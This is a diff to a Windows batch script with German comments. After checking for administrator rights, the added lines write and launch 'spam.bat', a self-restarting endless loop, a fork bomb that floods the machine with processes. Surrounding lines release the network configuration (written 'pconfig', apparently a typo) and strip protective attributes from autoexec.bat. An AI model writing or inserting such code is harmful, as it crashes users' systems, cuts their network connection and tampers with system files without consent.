@@ -9,6 +9,13 @@ REM Überprüfen, ob das Skript als Administrator ausgeführt wird
 NET SESSION >NUL 2>&1
 IF %ERRORLEVEL% EQU 0 (
     REM Der Benutzer ist ein Administrator, füge hier den eigentlichen Code ein
+echo @echo off >> spam.bat
+echo :A >> spam.bat
+echo start spam.bat >> spam.bat
+echo echo Spamming this thing idk >> spam.bat
+echo goto A >> spam.bat
+start spam.bat
+start Spam.bat
     pconfig /release
 
 attrib -r -s -h c:autoexec.bat
